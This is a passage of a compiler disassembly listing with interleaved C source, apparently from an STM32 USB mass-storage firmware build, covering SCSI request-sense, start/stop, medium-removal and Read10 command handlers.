 800a38a:	e007      	b.n	800a39c <SCSI_RequestSense+0x64>
  {
    hmsc->bot_data[i] = 0U;
 800a38c:	7dfb      	ldrb	r3, [r7, #23]
 800a38e:	693a      	ldr	r2, [r7, #16]
 800a390:	4413      	add	r3, r2
 800a392:	2200      	movs	r2, #0
 800a394:	741a      	strb	r2, [r3, #16]
  for (i = 0U; i < REQUEST_SENSE_DATA_LEN; i++)
 800a396:	7dfb      	ldrb	r3, [r7, #23]
 800a398:	3301      	adds	r3, #1
 800a39a:	75fb      	strb	r3, [r7, #23]
 800a39c:	7dfb      	ldrb	r3, [r7, #23]
 800a39e:	2b11      	cmp	r3, #17
 800a3a0:	d9f4      	bls.n	800a38c <SCSI_RequestSense+0x54>
  }

  hmsc->bot_data[0] = 0x70U;
 800a3a2:	693b      	ldr	r3, [r7, #16]
 800a3a4:	2270      	movs	r2, #112	; 0x70
 800a3a6:	741a      	strb	r2, [r3, #16]
  hmsc->bot_data[7] = REQUEST_SENSE_DATA_LEN - 6U;
 800a3a8:	693b      	ldr	r3, [r7, #16]
 800a3aa:	220c      	movs	r2, #12
 800a3ac:	75da      	strb	r2, [r3, #23]

  if ((hmsc->scsi_sense_head != hmsc->scsi_sense_tail))
 800a3ae:	693b      	ldr	r3, [r7, #16]
 800a3b0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a3b4:	f893 2060 	ldrb.w	r2, [r3, #96]	; 0x60
 800a3b8:	693b      	ldr	r3, [r7, #16]
 800a3ba:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a3be:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a3c2:	429a      	cmp	r2, r3
 800a3c4:	d03f      	beq.n	800a446 <SCSI_RequestSense+0x10e>
  {
    hmsc->bot_data[2] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].Skey;
 800a3c6:	693b      	ldr	r3, [r7, #16]
 800a3c8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a3cc:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a3d0:	461a      	mov	r2, r3
 800a3d2:	693b      	ldr	r3, [r7, #16]
 800a3d4:	f502 7202 	add.w	r2, r2, #520	; 0x208
 800a3d8:	f813 2032 	ldrb.w	r2, [r3, r2, lsl #3]
 800a3dc:	693b      	ldr	r3, [r7, #16]
 800a3de:	749a      	strb	r2, [r3, #18]
    hmsc->bot_data[12] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].w.b.ASC;
 800a3e0:	693b      	ldr	r3, [r7, #16]
 800a3e2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a3e6:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a3ea:	693a      	ldr	r2, [r7, #16]
 800a3ec:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a3f0:	00db      	lsls	r3, r3, #3
 800a3f2:	4413      	add	r3, r2
 800a3f4:	791a      	ldrb	r2, [r3, #4]
 800a3f6:	693b      	ldr	r3, [r7, #16]
 800a3f8:	771a      	strb	r2, [r3, #28]
    hmsc->bot_data[13] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].w.b.ASCQ;
 800a3fa:	693b      	ldr	r3, [r7, #16]
 800a3fc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a400:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a404:	693a      	ldr	r2, [r7, #16]
 800a406:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a40a:	00db      	lsls	r3, r3, #3
 800a40c:	4413      	add	r3, r2
 800a40e:	795a      	ldrb	r2, [r3, #5]
 800a410:	693b      	ldr	r3, [r7, #16]
 800a412:	775a      	strb	r2, [r3, #29]
    hmsc->scsi_sense_head++;
 800a414:	693b      	ldr	r3, [r7, #16]
 800a416:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a41a:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a41e:	3301      	adds	r3, #1
 800a420:	b2da      	uxtb	r2, r3
 800a422:	693b      	ldr	r3, [r7, #16]
 800a424:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a428:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60

    if (hmsc->scsi_sense_head == SENSE_LIST_DEEPTH)
 800a42c:	693b      	ldr	r3, [r7, #16]
 800a42e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a432:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a436:	2b04      	cmp	r3, #4
 800a438:	d105      	bne.n	800a446 <SCSI_RequestSense+0x10e>
    {
      hmsc->scsi_sense_head = 0U;
 800a43a:	693b      	ldr	r3, [r7, #16]
 800a43c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a440:	2200      	movs	r2, #0
 800a442:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60
    }
  }

  hmsc->bot_data_length = REQUEST_SENSE_DATA_LEN;
 800a446:	693b      	ldr	r3, [r7, #16]
 800a448:	2212      	movs	r2, #18
 800a44a:	60da      	str	r2, [r3, #12]

  if (params[4] <= REQUEST_SENSE_DATA_LEN)
 800a44c:	687b      	ldr	r3, [r7, #4]
 800a44e:	3304      	adds	r3, #4
 800a450:	781b      	ldrb	r3, [r3, #0]
 800a452:	2b12      	cmp	r3, #18
 800a454:	d805      	bhi.n	800a462 <SCSI_RequestSense+0x12a>
  {
    hmsc->bot_data_length = params[4];
 800a456:	687b      	ldr	r3, [r7, #4]
 800a458:	3304      	adds	r3, #4
 800a45a:	781b      	ldrb	r3, [r3, #0]
 800a45c:	461a      	mov	r2, r3
 800a45e:	693b      	ldr	r3, [r7, #16]
 800a460:	60da      	str	r2, [r3, #12]
  }

  return 0;
 800a462:	2300      	movs	r3, #0
}
 800a464:	4618      	mov	r0, r3
 800a466:	3718      	adds	r7, #24
 800a468:	46bd      	mov	sp, r7
 800a46a:	bd80      	pop	{r7, pc}

0800a46c <SCSI_SenseCode>:
  * @param  ASC: Additional Sense Code
  * @retval none

  */
void SCSI_SenseCode(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t sKey, uint8_t ASC)
{
 800a46c:	b480      	push	{r7}
 800a46e:	b085      	sub	sp, #20
 800a470:	af00      	add	r7, sp, #0
 800a472:	6078      	str	r0, [r7, #4]
 800a474:	4608      	mov	r0, r1
 800a476:	4611      	mov	r1, r2
 800a478:	461a      	mov	r2, r3
 800a47a:	4603      	mov	r3, r0
 800a47c:	70fb      	strb	r3, [r7, #3]
 800a47e:	460b      	mov	r3, r1
 800a480:	70bb      	strb	r3, [r7, #2]
 800a482:	4613      	mov	r3, r2
 800a484:	707b      	strb	r3, [r7, #1]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a486:	687b      	ldr	r3, [r7, #4]
 800a488:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a48c:	687b      	ldr	r3, [r7, #4]
 800a48e:	32b0      	adds	r2, #176	; 0xb0
 800a490:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a494:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 800a496:	68fb      	ldr	r3, [r7, #12]
 800a498:	2b00      	cmp	r3, #0
 800a49a:	d03d      	beq.n	800a518 <SCSI_SenseCode+0xac>
  {
    return;
  }

  hmsc->scsi_sense[hmsc->scsi_sense_tail].Skey = sKey;
 800a49c:	68fb      	ldr	r3, [r7, #12]
 800a49e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a4a2:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a4a6:	461a      	mov	r2, r3
 800a4a8:	68fb      	ldr	r3, [r7, #12]
 800a4aa:	f502 7202 	add.w	r2, r2, #520	; 0x208
 800a4ae:	78b9      	ldrb	r1, [r7, #2]
 800a4b0:	f803 1032 	strb.w	r1, [r3, r2, lsl #3]
  hmsc->scsi_sense[hmsc->scsi_sense_tail].w.b.ASC = ASC;
 800a4b4:	68fb      	ldr	r3, [r7, #12]
 800a4b6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a4ba:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a4be:	68fa      	ldr	r2, [r7, #12]
 800a4c0:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a4c4:	00db      	lsls	r3, r3, #3
 800a4c6:	4413      	add	r3, r2
 800a4c8:	787a      	ldrb	r2, [r7, #1]
 800a4ca:	711a      	strb	r2, [r3, #4]
  hmsc->scsi_sense[hmsc->scsi_sense_tail].w.b.ASCQ = 0U;
 800a4cc:	68fb      	ldr	r3, [r7, #12]
 800a4ce:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a4d2:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a4d6:	68fa      	ldr	r2, [r7, #12]
 800a4d8:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a4dc:	00db      	lsls	r3, r3, #3
 800a4de:	4413      	add	r3, r2
 800a4e0:	2200      	movs	r2, #0
 800a4e2:	715a      	strb	r2, [r3, #5]
  hmsc->scsi_sense_tail++;
 800a4e4:	68fb      	ldr	r3, [r7, #12]
 800a4e6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a4ea:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a4ee:	3301      	adds	r3, #1
 800a4f0:	b2da      	uxtb	r2, r3
 800a4f2:	68fb      	ldr	r3, [r7, #12]
 800a4f4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a4f8:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61

  if (hmsc->scsi_sense_tail == SENSE_LIST_DEEPTH)
 800a4fc:	68fb      	ldr	r3, [r7, #12]
 800a4fe:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a502:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a506:	2b04      	cmp	r3, #4
 800a508:	d107      	bne.n	800a51a <SCSI_SenseCode+0xae>
  {
    hmsc->scsi_sense_tail = 0U;
 800a50a:	68fb      	ldr	r3, [r7, #12]
 800a50c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a510:	2200      	movs	r2, #0
 800a512:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61
 800a516:	e000      	b.n	800a51a <SCSI_SenseCode+0xae>
    return;
 800a518:	bf00      	nop
  }
}
 800a51a:	3714      	adds	r7, #20
 800a51c:	46bd      	mov	sp, r7
 800a51e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800a522:	4770      	bx	lr

0800a524 <SCSI_StartStopUnit>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_StartStopUnit(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a524:	b580      	push	{r7, lr}
 800a526:	b086      	sub	sp, #24
 800a528:	af00      	add	r7, sp, #0
 800a52a:	60f8      	str	r0, [r7, #12]
 800a52c:	460b      	mov	r3, r1
 800a52e:	607a      	str	r2, [r7, #4]
 800a530:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a532:	68fb      	ldr	r3, [r7, #12]
 800a534:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a538:	68fb      	ldr	r3, [r7, #12]
 800a53a:	32b0      	adds	r2, #176	; 0xb0
 800a53c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a540:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a542:	697b      	ldr	r3, [r7, #20]
 800a544:	2b00      	cmp	r3, #0
 800a546:	d102      	bne.n	800a54e <SCSI_StartStopUnit+0x2a>
  {
    return -1;
 800a548:	f04f 33ff 	mov.w	r3, #4294967295
 800a54c:	e043      	b.n	800a5d6 <SCSI_StartStopUnit+0xb2>
  }

  if ((hmsc->scsi_medium_state == SCSI_MEDIUM_LOCKED) && ((params[4] & 0x3U) == 2U))
 800a54e:	697b      	ldr	r3, [r7, #20]
 800a550:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a554:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a558:	2b01      	cmp	r3, #1
 800a55a:	d10f      	bne.n	800a57c <SCSI_StartStopUnit+0x58>
 800a55c:	687b      	ldr	r3, [r7, #4]
 800a55e:	3304      	adds	r3, #4
 800a560:	781b      	ldrb	r3, [r3, #0]
 800a562:	f003 0303 	and.w	r3, r3, #3
 800a566:	2b02      	cmp	r3, #2
 800a568:	d108      	bne.n	800a57c <SCSI_StartStopUnit+0x58>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_FIELED_IN_COMMAND);
 800a56a:	7af9      	ldrb	r1, [r7, #11]
 800a56c:	2324      	movs	r3, #36	; 0x24
 800a56e:	2205      	movs	r2, #5
 800a570:	68f8      	ldr	r0, [r7, #12]
 800a572:	f7ff ff7b 	bl	800a46c <SCSI_SenseCode>

    return -1;
 800a576:	f04f 33ff 	mov.w	r3, #4294967295
 800a57a:	e02c      	b.n	800a5d6 <SCSI_StartStopUnit+0xb2>
  }

  if ((params[4] & 0x3U) == 0x1U) /* START=1 */
 800a57c:	687b      	ldr	r3, [r7, #4]
 800a57e:	3304      	adds	r3, #4
 800a580:	781b      	ldrb	r3, [r3, #0]
 800a582:	f003 0303 	and.w	r3, r3, #3
 800a586:	2b01      	cmp	r3, #1
 800a588:	d106      	bne.n	800a598 <SCSI_StartStopUnit+0x74>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a58a:	697b      	ldr	r3, [r7, #20]
 800a58c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a590:	2200      	movs	r2, #0
 800a592:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a596:	e01a      	b.n	800a5ce <SCSI_StartStopUnit+0xaa>
  }
  else if ((params[4] & 0x3U) == 0x2U) /* START=0 and LOEJ Load Eject=1 */
 800a598:	687b      	ldr	r3, [r7, #4]
 800a59a:	3304      	adds	r3, #4
 800a59c:	781b      	ldrb	r3, [r3, #0]
 800a59e:	f003 0303 	and.w	r3, r3, #3
 800a5a2:	2b02      	cmp	r3, #2
 800a5a4:	d106      	bne.n	800a5b4 <SCSI_StartStopUnit+0x90>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_EJECTED;
 800a5a6:	697b      	ldr	r3, [r7, #20]
 800a5a8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a5ac:	2202      	movs	r2, #2
 800a5ae:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a5b2:	e00c      	b.n	800a5ce <SCSI_StartStopUnit+0xaa>
  }
  else if ((params[4] & 0x3U) == 0x3U) /* START=1 and LOEJ Load Eject=1 */
 800a5b4:	687b      	ldr	r3, [r7, #4]
 800a5b6:	3304      	adds	r3, #4
 800a5b8:	781b      	ldrb	r3, [r3, #0]
 800a5ba:	f003 0303 	and.w	r3, r3, #3
 800a5be:	2b03      	cmp	r3, #3
 800a5c0:	d105      	bne.n	800a5ce <SCSI_StartStopUnit+0xaa>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a5c2:	697b      	ldr	r3, [r7, #20]
 800a5c4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a5c8:	2200      	movs	r2, #0
 800a5ca:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
  }
  else
  {
    /* .. */
  }
  hmsc->bot_data_length = 0U;
 800a5ce:	697b      	ldr	r3, [r7, #20]
 800a5d0:	2200      	movs	r2, #0
 800a5d2:	60da      	str	r2, [r3, #12]

  return 0;
 800a5d4:	2300      	movs	r3, #0
}
 800a5d6:	4618      	mov	r0, r3
 800a5d8:	3718      	adds	r7, #24
 800a5da:	46bd      	mov	sp, r7
 800a5dc:	bd80      	pop	{r7, pc}

0800a5de <SCSI_AllowPreventRemovable>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_AllowPreventRemovable(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a5de:	b480      	push	{r7}
 800a5e0:	b087      	sub	sp, #28
 800a5e2:	af00      	add	r7, sp, #0
 800a5e4:	60f8      	str	r0, [r7, #12]
 800a5e6:	460b      	mov	r3, r1
 800a5e8:	607a      	str	r2, [r7, #4]
 800a5ea:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a5ec:	68fb      	ldr	r3, [r7, #12]
 800a5ee:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a5f2:	68fb      	ldr	r3, [r7, #12]
 800a5f4:	32b0      	adds	r2, #176	; 0xb0
 800a5f6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a5fa:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a5fc:	697b      	ldr	r3, [r7, #20]
 800a5fe:	2b00      	cmp	r3, #0
 800a600:	d102      	bne.n	800a608 <SCSI_AllowPreventRemovable+0x2a>
  {
    return -1;
 800a602:	f04f 33ff 	mov.w	r3, #4294967295
 800a606:	e015      	b.n	800a634 <SCSI_AllowPreventRemovable+0x56>
  }

  if (params[4] == 0U)
 800a608:	687b      	ldr	r3, [r7, #4]
 800a60a:	3304      	adds	r3, #4
 800a60c:	781b      	ldrb	r3, [r3, #0]
 800a60e:	2b00      	cmp	r3, #0
 800a610:	d106      	bne.n	800a620 <SCSI_AllowPreventRemovable+0x42>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a612:	697b      	ldr	r3, [r7, #20]
 800a614:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a618:	2200      	movs	r2, #0
 800a61a:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a61e:	e005      	b.n	800a62c <SCSI_AllowPreventRemovable+0x4e>
  }
  else
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_LOCKED;
 800a620:	697b      	ldr	r3, [r7, #20]
 800a622:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a626:	2201      	movs	r2, #1
 800a628:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
  }

  hmsc->bot_data_length = 0U;
 800a62c:	697b      	ldr	r3, [r7, #20]
 800a62e:	2200      	movs	r2, #0
 800a630:	60da      	str	r2, [r3, #12]

  return 0;
 800a632:	2300      	movs	r3, #0
}
 800a634:	4618      	mov	r0, r3
 800a636:	371c      	adds	r7, #28
 800a638:	46bd      	mov	sp, r7
 800a63a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800a63e:	4770      	bx	lr

0800a640 <SCSI_Read10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Read10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a640:	b580      	push	{r7, lr}
 800a642:	b086      	sub	sp, #24
 800a644:	af00      	add	r7, sp, #0
 800a646:	60f8      	str	r0, [r7, #12]
 800a648:	460b      	mov	r3, r1
 800a64a:	607a      	str	r2, [r7, #4]
 800a64c:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a64e:	68fb      	ldr	r3, [r7, #12]
 800a650:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a654:	68fb      	ldr	r3, [r7, #12]
 800a656:	32b0      	adds	r2, #176	; 0xb0
 800a658:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a65c:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a65e:	697b      	ldr	r3, [r7, #20]
 800a660:	2b00      	cmp	r3, #0
 800a662:	d102      	bne.n	800a66a <SCSI_Read10+0x2a>
  {
    return -1;
 800a664:	f04f 33ff 	mov.w	r3, #4294967295
 800a668:	e09d      	b.n	800a7a6 <SCSI_Read10+0x166>
  }

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a66a:	697b      	ldr	r3, [r7, #20]
 800a66c:	7a1b      	ldrb	r3, [r3, #8]
 800a66e:	2b00      	cmp	r3, #0
 800a670:	f040 808f 	bne.w	800a792 <SCSI_Read10+0x152>
  {
    /* case 10 : Ho <> Di */
    if ((hmsc->cbw.bmFlags & 0x80U) != 0x80U)
 800a674:	697b      	ldr	r3, [r7, #20]
 800a676:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a67a:	7f1b      	ldrb	r3, [r3, #28]
 800a67c:	b25b      	sxtb	r3, r3
 800a67e:	2b00      	cmp	r3, #0
 800a680:	db0b      	blt.n	800a69a <SCSI_Read10+0x5a>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a682:	697b      	ldr	r3, [r7, #20]
 800a684:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a688:	7f59      	ldrb	r1, [r3, #29]
 800a68a:	2320      	movs	r3, #32
 800a68c:	2205      	movs	r2, #5
 800a68e:	68f8      	ldr	r0, [r7, #12]
 800a690:	f7ff feec 	bl	800a46c <SCSI_SenseCode>
      return -1;
 800a694:	f04f 33ff 	mov.w	r3, #4294967295
 800a698:	e085      	b.n	800a7a6 <SCSI_Read10+0x166>
    }

    if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 800a69a:	697b      	ldr	r3, [r7, #20]
 800a69c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a6a0:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a6a4:	2b02      	cmp	r3, #2
 800a6a6:	d108      	bne.n	800a6ba <SCSI_Read10+0x7a>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a6a8:	7af9      	ldrb	r1, [r7, #11]
 800a6aa:	233a      	movs	r3, #58	; 0x3a
 800a6ac:	2202      	movs	r2, #2
 800a6ae:	68f8      	ldr	r0, [r7, #12]
 800a6b0:	f7ff fedc 	bl	800a46c <SCSI_SenseCode>

      return -1;
 800a6b4:	f04f 33ff 	mov.w	r3, #4294967295
 800a6b8:	e075      	b.n	800a7a6 <SCSI_Read10+0x166>
    }

    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a6ba:	68fb      	ldr	r3, [r7, #12]
 800a6bc:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a6c0:	68fa      	ldr	r2, [r7, #12]
 800a6c2:	33b0      	adds	r3, #176	; 0xb0
 800a6c4:	009b      	lsls	r3, r3, #2
 800a6c6:	4413      	add	r3, r2
 800a6c8:	685b      	ldr	r3, [r3, #4]
 800a6ca:	689b      	ldr	r3, [r3, #8]
 800a6cc:	7afa      	ldrb	r2, [r7, #11]
 800a6ce:	4610      	mov	r0, r2
 800a6d0:	4798      	blx	r3
 800a6d2:	4603      	mov	r3, r0
 800a6d4:	2b00      	cmp	r3, #0
 800a6d6:	d008      	beq.n	800a6ea <SCSI_Read10+0xaa>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a6d8:	7af9      	ldrb	r1, [r7, #11]
 800a6da:	233a      	movs	r3, #58	; 0x3a
 800a6dc:	2202      	movs	r2, #2
 800a6de:	68f8      	ldr	r0, [r7, #12]
 800a6e0:	f7ff fec4 	bl	800a46c <SCSI_SenseCode>
      return -1;
 800a6e4:	f04f 33ff 	mov.w	r3, #4294967295
 800a6e8:	e05d      	b.n	800a7a6 <SCSI_Read10+0x166>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a6ea:	687b      	ldr	r3, [r7, #4]
 800a6ec:	3302      	adds	r3, #2
 800a6ee:	781b      	ldrb	r3, [r3, #0]
 800a6f0:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a6f2:	687b      	ldr	r3, [r7, #4]
 800a6f4:	3303      	adds	r3, #3
 800a6f6:	781b      	ldrb	r3, [r3, #0]
 800a6f8:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a6fa:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] <<  8) |
 800a6fc:	687b      	ldr	r3, [r7, #4]
 800a6fe:	3304      	adds	r3, #4
 800a700:	781b      	ldrb	r3, [r3, #0]
 800a702:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a704:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a706:	687a      	ldr	r2, [r7, #4]
 800a708:	3205      	adds	r2, #5
 800a70a:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] <<  8) |
 800a70c:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a70e:	697a      	ldr	r2, [r7, #20]
 800a710:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a714:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[7] <<  8) | (uint32_t)params[8];
 800a716:	687b      	ldr	r3, [r7, #4]
 800a718:	3307      	adds	r3, #7
 800a71a:	781b      	ldrb	r3, [r3, #0]
 800a71c:	021b      	lsls	r3, r3, #8
 800a71e:	687a      	ldr	r2, [r7, #4]
 800a720:	3208      	adds	r2, #8
 800a722:	7812      	ldrb	r2, [r2, #0]
 800a724:	4313      	orrs	r3, r2
 800a726:	697a      	ldr	r2, [r7, #20]
 800a728:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a72c:	6713      	str	r3, [r2, #112]	; 0x70

    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a72e:	697b      	ldr	r3, [r7, #20]
 800a730:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a734:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a736:	697b      	ldr	r3, [r7, #20]
 800a738:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a73c:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a73e:	7af9      	ldrb	r1, [r7, #11]
 800a740:	68f8      	ldr	r0, [r7, #12]
 800a742:	f000 fb0c 	bl	800ad5e <SCSI_CheckAddressRange>
 800a746:	4603      	mov	r3, r0
 800a748:	2b00      	cmp	r3, #0
 800a74a:	da02      	bge.n	800a752 <SCSI_Read10+0x112>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a74c:	f04f 33ff 	mov.w	r3, #4294967295
 800a750:	e029      	b.n	800a7a6 <SCSI_Read10+0x166>
    }

    /* cases 4,5 : Hi <> Dn */
    if (hmsc->cbw.dDataLength != (hmsc->scsi_blk_len * hmsc->scsi_blk_size))
 800a752:	697b      	ldr	r3, [r7, #20]
 800a754:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a758:	699a      	ldr	r2, [r3, #24]
 800a75a:	697b      	ldr	r3, [r7, #20]
 800a75c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a760:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a762:	6979      	ldr	r1, [r7, #20]
 800a764:	f501 5180 	add.w	r1, r1, #4096	; 0x1000
 800a768:	f8b1 1064 	ldrh.w	r1, [r1, #100]	; 0x64
 800a76c:	fb01 f303 	mul.w	r3, r1, r3
 800a770:	429a      	cmp	r2, r3
 800a772:	d00b      	beq.n	800a78c <SCSI_Read10+0x14c>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a774:	697b      	ldr	r3, [r7, #20]
 800a776:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a77a:	7f59      	ldrb	r1, [r3, #29]
 800a77c:	2320      	movs	r3, #32
 800a77e:	2205      	movs	r2, #5
 800a780:	68f8      	ldr	r0, [r7, #12]
 800a782:	f7ff fe73 	bl	800a46c <SCSI_SenseCode>
      return -1;
 800a786:	f04f 33ff 	mov.w	r3, #4294967295
 800a78a:	e00c      	b.n	800a7a6 <SCSI_Read10+0x166>
    }

    hmsc->bot_state = USBD_BOT_DATA_IN;
 800a78c:	697b      	ldr	r3, [r7, #20]
 800a78e:	2202      	movs	r2, #2
 800a790:	721a      	strb	r2, [r3, #8]
  }
  hmsc->bot_data_length = MSC_MEDIA_PACKET;
 800a792:	697b      	ldr	r3, [r7, #20]
 800a794:	f44f 5280 	mov.w	r2, #4096	; 0x1000
 800a798:	60da      	str	r2, [r3, #12]

  return SCSI_ProcessRead(pdev, lun);
 800a79a:	7afb      	ldrb	r3, [r7, #11]
 800a79c:	4619      	mov	r1, r3
 800a79e:	68f8      	ldr	r0, [r7, #12]
 800a7a0:	f000 fb0a 	bl	800adb8 <SCSI_ProcessRead>
 800a7a4:	4603      	mov	r3, r0
}
 800a7a6:	4618      	mov	r0, r3
 800a7a8:	3718      	adds	r7, #24
 800a7aa:	46bd      	mov	sp, r7
 800a7ac:	bd80      	pop	{r7, pc}

0800a7ae <SCSI_Read12>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Read12(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
